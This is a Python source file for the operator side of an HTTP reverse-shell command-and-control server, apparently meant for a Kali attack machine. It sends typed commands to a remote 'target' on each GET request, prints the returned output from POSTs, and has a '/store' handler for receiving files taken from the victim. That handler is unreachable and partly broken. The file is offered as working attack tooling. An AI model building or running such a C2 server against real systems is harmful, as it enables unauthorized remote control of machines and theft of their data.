import http.server
from colorama import Fore, Style
import os
import cgi

HOST_NAME = '127.0.0.1'  # Kali IP address
PORT_NUMBER = 80  # Listening port number


class MyHandler(http.server.BaseHTTPRequestHandler):  # MyHandler defines what we should do from the client / target
    def do_GET(s):
        # If we got a GET request, we will:-
        s.send_response(200,message=None)  # return HTML status 200 (OK)
        s.send_header("Content-type", "text/html")  # Inform the target that content type head
        s.end_headers()
        cmd = input(f"{Fore.LIGHTCYAN_EX}(Abuqasem)>{Style.RESET_ALL} ")  # take user input
        s.wfile.write(cmd.encode("utf-8"))  # send the command which we got from the user input

    def do_POST(s):
        # If we got a POST, we will:-
        s.send_response(200)  # return HTML status 200 (OK)
        s.end_headers()
        length = int(s.headers['Content-Length'])  # Define the length which means how many bytes
        # value has to be integer
        postVar = s.rfile.read(length)  # Read then print the posted data
        print(postVar.strip().decode("utf-8"), end="")

    def getfile(s):
        if s.path == '/store':
            try:
                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data':
                    fs = cgi.FieldStorage(fp=s.rfile,headers=s.headers,environ={'REQUEST_METHOD': 'POST'})
                else:
                    print("[-] Unexpected POST request")
                    fs_up = fs['file']
                with open('/proof.txt', 'wb') as o:
                    o.write(fs_up.file.read())
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print (e)
                return

if __name__ == '__main__':
    # We start a server_class and create httpd object and pass our kali IP,port number and cl
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, PORT_NUMBER), MyHandler)
    try:
        print(f"{Fore.LIGHTGREEN_EX}(Listening on port)->[{PORT_NUMBER}]{Style.RESET_ALL}")
        httpd.serve_forever()  # start the HTTP server, however if we got ctrl+c we will Inter
    except KeyboardInterrupt:
        print(f"{Fore.RED}[!] Server is terminated{Style.RESET_ALL}")
        httpd.server_close()
